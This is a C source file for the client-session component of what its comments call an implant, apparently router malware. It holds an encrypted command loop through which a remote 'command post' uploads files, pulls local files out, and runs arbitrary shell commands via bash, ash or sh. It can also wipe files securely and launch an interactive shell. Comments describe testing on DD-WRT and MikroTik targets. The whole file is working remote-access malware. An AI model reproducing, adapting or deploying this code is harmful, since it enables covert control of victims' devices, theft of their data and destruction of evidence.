#include "client_session.h"

#if defined LINUX || defined SOLARIS
#include <time.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <unistd.h>
#include <sys/wait.h>
#endif

#include "launchshell.h"

#define _USE_32BIT_TIME_T
#define _INC_STAT_INL
#include <sys/stat.h>
#include "crypto.h"

static int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut);
static int UploadFile(char* path, unsigned long size, int sock);
static int DownloadFile(char *sath, unsigned long size, int sock);
static int Execute( char *path );
static int DelFile( char *path );
static int ExpandEnvStrings( char* path, char** newpath);
static int SecureDelete( char *path );
static int hstat( int fd );

const unsigned long CMD_TIMEOUT = 5*60*1000; // 5 minutes
const unsigned long PKT_TIMEOUT = 30*1000; // 30 sec.

crypt_context *cp;		// Command Post network connection context

#define _fstat fstat

//******************************************************************
//***************** Cross Platform functions ***********************
//******************************************************************

unsigned int GenRandomBytes(unsigned char * buf, unsigned int size)
{
	unsigned int i;

	//srand((unsigned int)rand());  NOT NEEDED...

	for (i=0;i<size;i++)
	{
		buf[i] = (unsigned char)(rand() % 255);
	}

	return 0;
}

//******************************************************************
int write_all( int fd, void *ptr, int n )
{
	int		nleft;
	int		nwritten;

	nleft = n;

	while ( nleft > 0 )
	{
		if (( nwritten = write( fd, ptr, nleft )) < 0 )
		{
			// if first time through, error
			if ( nleft == n ) return (-1);
			// else, return what we were successful in writing
			else break;
		}
		else if ( nwritten == 0 )
		{
			break;
		}

		nleft -= nwritten;
		ptr = (char *)ptr + nwritten;
	}

	return ( n - nleft );
}

/*!
 * Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
 * @brief Waits for data to arrive on the socket and reads it in until the buffer is full.
 * @param sock - socket on which to receive
 * @param buf - receiving buffer
 * @param size - size of receiving buffer
 * @param timeOut - Stop and return on timeout.
 * @return
 */
int Receive(int sock, unsigned char* buf, unsigned long size, unsigned long timeOut)
{
	unsigned long		receivedTotal = 0;
	int					received = 0;
	fd_set				readFDs;
	struct timeval		timeout;

	timeout.tv_sec = timeOut/1000;
	FD_ZERO(&readFDs);

	if(sock != INVALID_SOCKET) {
		FD_SET(sock, &readFDs);
	}

	//while there is room in the buffer keep going
	while(receivedTotal < size) {
		if (select(sock+1,&readFDs,0,0,&timeout)) {
//			received = recv(sock,(char*)buf + receivedTotal,size - receivedTotal,0);
			if ((received = crypt_read(cp, buf + receivedTotal, size - receivedTotal)) < 0) {
				DLX(4, printf("crypt_read() failed: "); print_ssl_error(received));
				return SOCKET_ERROR;
			}
			if(received == 0)
				break;

			receivedTotal += received;
		}
	}
	return receivedTotal;
}

//******************************************************************
/*!
 * Upload a file from the command post to a local file
 * @param path - path and filename of the local file
 * @param size - size of the file
 * @param sock - socket
 * @return - Success = 0, Failure = -1
 */
int UploadFile(char* path, unsigned long size, int sock)
{
	REPLY ret;					// Reply struct
	DATA data;					// File transfer Data struct
	int retval;
	int bytes_read = 0;
	unsigned int received = 0, written = 0;

	FILE* fd;

	// Attempt to create local file
	fd = fopen(path,"wb");
	if(fd == 0) {
		return errno;
	}
	DLX(2, printf("Opened path: %s\n", path));

	// Set successful reply
	ret.reply = 0;

	//send reply (guessing it lets client know we are ready to receive data of file?)
//	if(SOCKET_ERROR == send(sock,(const char*) &ret, sizeof(REPLY),0))
	// TODO <= 0
	if (crypt_write(cp, (unsigned char*) &ret, sizeof(REPLY)) < 0) {
		goto Error;
	}
	DLX(2, printf("Acknowledged UploadFile with file size of %lu bytes\n", size));
	
	while (received < size) {
		// Read bytes from network
		if ((bytes_read = Receive(sock,(unsigned char*) &data, (size-received > sizeof(DATA)) ? sizeof(DATA) : size-received, PKT_TIMEOUT)) <= 0) {
			if (bytes_read == 0) {
				DLX(4, printf("Session disconnected\n"));
				break;
			}
			DLX(4, printf("ERROR: Receive()\n"));
			goto Error;
		}
		DLX(8, printf("Receive() bytes_read: %d\n", bytes_read));
		// Write bytes to file
		written = 0;
		while (written < (unsigned int)bytes_read) {
			if ((retval = fwrite( data.data, 1, bytes_read, fd )) == 0) {
				if (ferror(fd)) {
					DLX(4, printf("ERROR: fwrite()\n"));
					goto Error;
				}
				break;
			}
			written += retval;
		}
		received += bytes_read;
		DLX(8, printf("Bytes received: %u\n", received));
	}

	if (fclose(fd) != 0) {
		DLX(4, printf("fclose() failed\n"));
		return -1;
	}
	return 0;

Error:
	fclose(fd);
	unlink(path);
	return -1;
}

//******************************************************************
/*!
 * Download a file from the local system to the command post
 * @param path - complete path and filename
 * @param size - size of file
 * @param sock - socket
 * @return
 */
int DownloadFile(char *path, unsigned long size, int sock)
{
	REPLY ret;		// Reply struct
	unsigned char data[DATA_BUFFER_SIZE];
	struct stat buf;
	FILE *fd;
	int	bytes_read, bytes_written;

	//TODO: Review and fix/remove this.
	// to silence compiler warnings. this var no longer needed because of the 
	// ssl_context declared global to this file
	sock = sock;

	// Attempt to open local file for download
	fd = fopen( path, "rb" );	

	if ( fd == 0 )
	{
		DLX(1, perror("fopen(): "));
		return errno;
	}

	// Get file size
	// fstat() && stat() do not work on DD-WRT test surrogate for Linux MIPS-LE
//	if( stat( path, &buf ) != 0 )
	if( _fstat( fileno( fd ), &buf ) != 0 )
	{
		DLX(1, perror("fstat(): "));
		goto Error;
	}

	size = buf.st_size;
	if ( size == 0 )
	{
		// double-check size calculation
		size = hstat( fileno( fd ) );
	}
	DLX(2, printf("File: %s\n", path));
	DLX(2, printf("File size: %ld\n", size));

	// Setup reply struct
	ret.reply = 0;
	// Place file size in struct padding (Download was a late addition. Hence the hack.)
	ret.padding = htonl(size);

	// Send reply with the file size so the client knows
	DLX(4, printf("Sending reply: reply = %lu, length = 0x%lx\n", ret.reply, ret.padding));
	if (crypt_write(cp, (unsigned char*)&ret, sizeof(REPLY)) < 0)
	{
		DLX(2, printf("crypt_write() error\n"));
		goto Error;
	}

	bytes_read = 0;
	while (size) {		// Read file
		DLX(8, printf("Reading file: %s of size %lu\n", path, size));
		if ((bytes_read = fread(data, 1, size > DATA_BUFFER_SIZE ? DATA_BUFFER_SIZE : size, fd)) <= 0) {
			if (feof(fd))	// EOF
				break;
			DLX(4, printf("Error reading file: %s, errno = \n", path));
			goto Error;
		}
		DPB(8, "File bytes read", data, bytes_read);
		bytes_written = 0;
		do {
			int rv;
			// Write file to the network
			DLX(8, printf("Writing data of length %u to network\n", bytes_read));
			if ((rv = crypt_write(cp, data, bytes_read)) < 0) {
				if (bytes_written == POLARSSL_ERR_NET_WANT_WRITE)
					continue;
				DLX(3, printf("crypt_write() failed:"); print_ssl_error(rv));
				goto Error;
			}
			bytes_written += rv;
		} while (bytes_read > bytes_written);
		size -= bytes_read;
	}

	fclose( fd );
	return 0;

Error:
	fclose( fd );
	return errno;
}

//******************************************************************
int DelFile( char *path )
{
	// Attempt to delete file
	if(unlink(path) < 0)
	{
		return errno;
	}

	return 0;
}

//******************************************************************
// this function should only be called when a target does not support fstat()
// like DD-WRT v24-sp2 std
int hstat( int fd )
{
	int 	fsize = 0;

	// seek to end of file and lseek() will return offset.
	// offset == file size
	if ( ( fsize = lseek( fd, 0, SEEK_END ) ) < 0 )
	{
		DLX(4, perror("lseek(): SEEK_END: "));
		return -1;
	}

	// reset offset back to beginning of the file
	if ( lseek( fd, 0, SEEK_SET ) < 0 )
	{
		DLX(4, perror("lseek(): SEEK_SET: "));
		return -1;
	}

	return fsize;

}

//******************************************************************
int SecureDelete( char *path )
{
	
	FILE* 			fd;
	struct stat 	buf;
	unsigned char	zerobuf[ 4096 ];
	int				remaining;
	int				numWritten;
	int				fsize;

	// Just to make sure
	memset( zerobuf, 0, 4096 );

	//First open the file with the flags f+b
	fd = fopen(path,"r+b");	

	//check to see if file opened
	if(fd == 0)
	{
		D(perror( "fopen()"));
		return errno;
	}

	// Get file size
	if( _fstat(fileno(fd),&buf) != 0)
	{
		D(perror( "fstat()"));
		goto Error;
	}
	fsize = buf.st_size;
	// for the DD-WRT v24-sp2 (11/02/09) std, fstat() not working correctly.  It will always
	// return buf.st_size == 0.  File still deleted, but not securely.  This presents a greater
	// problem for Download() which relies on fstat() returning a proper file size priot to txfr
	if ( fsize == 0 )
	{
		// double-check size calculation
		fsize = hstat( fileno( fd ) );
	}


	// Loop as necessary while calling fwrite() to write zeroes out to the original file:
	//
	remaining = fsize;
	while ( remaining > 0)
	{
		numWritten   = 0;
		numWritten = fwrite( zerobuf, 1, MIN( 4096, remaining) ,fd);
		if(numWritten <= 0)
		{
			D(perror( "fwrite()"));
			goto Error;
		}
		remaining -= numWritten;
	} 

	fflush(fd); //Flush the CRT buffers... this will send to OS buffers

	//... so flush the OS buffers so that the zeros are actually written to disk

#if defined LINUX || defined SOLARIS
	if ( 0 != fsync( fileno(fd)) ) goto Error;
	if ( 0 != fsync( fileno(fd)) ) goto Error;
	if ( 0 != fsync( fileno(fd)) ) goto Error;

	sync(); sync(); sync();
#endif

	fclose(fd);

#ifdef _USE_UNLINK
	unlink( path );
#else
	if ( remove( path) != 0 )
	{
		// so far, the only platform that has not supported remove() is the
		// DD-WRT v24-sp2 (11/02/09) std firmware flashed to a Linksys
		// WRT54G v1.0 for surrogate testing of MikroTik MIPS-LE.
		// Given prior successful testing with the MikroTik RouterOS on 
		// other hardware, remove() is expected to work.....
		// With DD-WRT, remove() fails with "can't resolve symbol 'remove'"
		DLX(2, perror("remove(): "));
		goto Error;
	}
#endif

	return 0;

Error:
	fclose( fd );
	return errno;
}


unsigned long StartClientSession( int sock )
{
	int fQuit = 0;
	int retval = 0;
	char* commandpath = 0;

	DL(2);
	// we have an established TCP/IP connection
	// although we consider this the SERVER, for the SSL/TLS transaction, 
	// the implant acts as a SSL client
	if ((cp = crypt_setup_client(&sock)) == NULL)
	{
		DLX(2, printf("ERROR: crypt_setup_client()\n"));
			crypt_cleanup(cp);
		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
	}

	// start TLS handshake
	DL(3);
	if ( crypt_handshake(cp) != SUCCESS )
	{
		DLX(2, printf("ERROR: TLS connection with TLS server failed to initialize.\n"));
			crypt_cleanup(cp);
		return FAILURE; //TODO: SHOULD THESE BE GOING TO EXIT AT BOTTOM???
	}
	DLX(3, printf("TLS handshake complete.\n"));

	// Create AES Tunnel
	if (aes_init(cp) == 0) {
		DLX(4, printf("aes_init() failed\n"));
		goto Exit;
	}

	while(!fQuit)
	{
		COMMAND cmd;
		REPLY ret;
		int r;

		// Fill reply buffer with random bytes
		GenRandomBytes((unsigned char *)&ret, sizeof(REPLY));

		// Get command, waiting up to SESSION_TIMEOUT seconds between commands.
		// If a command is not received before the timeout expires, exit.
		// This timeout is reset each time a command is received.
		alarm( SESSION_TIMEOUT );
		memset(&cmd, 0, sizeof(COMMAND));		// Clear any previous commands
		if ((r = crypt_read(cp, (unsigned char *)&cmd, sizeof(COMMAND))) < 0 ) {
			switch(r) {
			case POLARSSL_ERR_NET_WANT_READ:
				DLX(4, printf("crypt_read() POLARSSL_ERR_NET_WANT_READ, continue reading"));
				continue;
				break;
			case POLARSSL_ERR_SSL_PEER_CLOSE_NOTIFY:
				DLX(4, printf("crypt_read() POLARSSL_ERR_SSL_PEER_CLOSE_NOTIFY, exiting"));
				goto Exit;
				break;

			default:
				if (r < 0) {
					DLX(4, printf("crypt_read() failed: "); print_ssl_error(r));
					goto Exit;
				}
				DLX(4, printf("crypt_read() returned: %d (0x%x)", r, r));
				break;
			}

		}
		alarm( 0 );

		// Expand the cmd.path to the proper path resolving ENVIRONMENT variables
		if( commandpath != 0 )
		{
			free( commandpath );
			commandpath = 0;
		}
		ExpandEnvStrings(cmd.path, &commandpath);

		DLX(2, printf ("\tExecuting command: 0x%0x\n", cmd.command));

		//act on command, THESE FOLLOWING VALUES ARE DEFINED IN THE Shell.h file.
		switch(cmd.command) {

			case 0:
			case EXIT:
				DLX(2, printf("EXIT command received.\n"));
				fQuit = 1;
				ret.reply = 0;
				break;

			case UPLOAD:
				DLX(2, printf("UPLOAD command received.\n"));
				ret.reply = UploadFile(commandpath, ntohl(cmd.size),sock);
				break;

			case DOWNLOAD:
				DLX(2, printf("DOWNLOAD command received.\n"));
				ret.reply = DownloadFile(commandpath, ntohl(cmd.size), sock);
				break;

			case EXECUTE:
				DLX(2, printf("EXECUTE command received.\n"));
				memset((unsigned char *)&ret, '\0', sizeof(REPLY));    //Clear up the reply...
				ret.reply = Execute( commandpath );
				break;

			case DELETE:
				DLX(2, printf("DELETE command received, attempting SECURE DELETE...\n"));
				ret.reply = SecureDelete(commandpath);

				//If SecureDelete failed, ret.reply is not 0 so try to use DelFile function
				if (ret.reply != 0) {
					DLX(2, printf("Now attempting to UNLINK the file: %s\n", commandpath));
					ret.reply = DelFile(commandpath);
				}
				break;

	//TODO: The following code (from here through the exit) needs to be reviewed.
			case SHUTDOWNBOTH:
				DLX(2, printf("SHUTDOWN command received.\n"));
				fQuit = 1;
				ret.reply = 0;
				crypt_write(cp, (unsigned char*)&ret, sizeof(ret));
				crypt_cleanup(cp);
				closesocket(sock);
				sock = INVALID_SOCKET;
				retval = SHUTDOWN;
				//TODO: Linux used "break", Solaris used "goto Exit". Investigate this further.
#ifdef LINUX
				break;
#else
				goto Exit;
#endif

			case LAUNCHTRUESHELL:
				ret.reply = launchShell(commandpath);
				DLX(2, printf("LAUNCHTRUESHELL command received, returned: %i\n", (int)ret.reply));
				break;

			default:
				DLX(2, printf("Command not recognized.\n"));
				continue;
			//	fQuit = 1;
			//	break;

		}

		// Send reply
		if (crypt_write(cp, (unsigned char*)&ret, sizeof(ret)) < 0) {
			closesocket(sock);
			goto Exit;
		}
	}

		// TODO: Instead of allowing this function to return to connectShell and then trigger_exec where then
		// retval == SHUTDOWN is processed, why not process it here?  it might eliminate some tracing
		// back and forth.
Exit:
	if( commandpath != 0 )
		free( commandpath );
	aes_terminate(cp);
	crypt_cleanup(cp);
	return retval;
}

int Execute( char *path )
{
	//Assume success...
	D(int rv);
	int status=0; 
	pid_t pid;
	char* receivedCommand;

	receivedCommand = path;

	pid = fork();
	if (pid == 0)
	{
		// Use the first shell that will execute.
		(void)execl("/bin/bash", "bash", "-c", receivedCommand, NULL);
		(void)execl("/bin/ash", "ash", "-c", receivedCommand, NULL);
		(void)execl("/bin/sh", "sh", "-c", receivedCommand, NULL);
		exit(EXIT_FAILURE);
	}
	else if (pid < 0)
	{
		//The fork failed, report the error;
		status = -1;
	}
	else
	{
		//This is the parent process, Wait for the child to complete.
		D(rv =) waitpid( pid, &status, 0);
		DLX(2, printf("waitpid() returned %d while waiting for pid %d\n", rv, (int)pid));
		if (WIFEXITED(status))
		{
			DLX(2, printf("Child terminated normally with exit status: %d\n", WEXITSTATUS(status) ));
		}
		if (WIFSIGNALED(status))
		{
			DLX(2, printf("Child was terminated by signal: %d\n", WTERMSIG(status) ));
		}

	}

	DLX(2, printf("Received Command: %s, Status: %i\n", receivedCommand, status));
	return(status);
}
    
int ExpandEnvStrings( char* path, char** newpath)
{
	//TODO: Validate on Solaris
	int retval = 0;
	*newpath = (char*) malloc( sizeof( ((COMMAND*)0)->path) ); 
	memcpy( *newpath, path, sizeof( ((COMMAND*)0)->path)); 
	return retval;
}
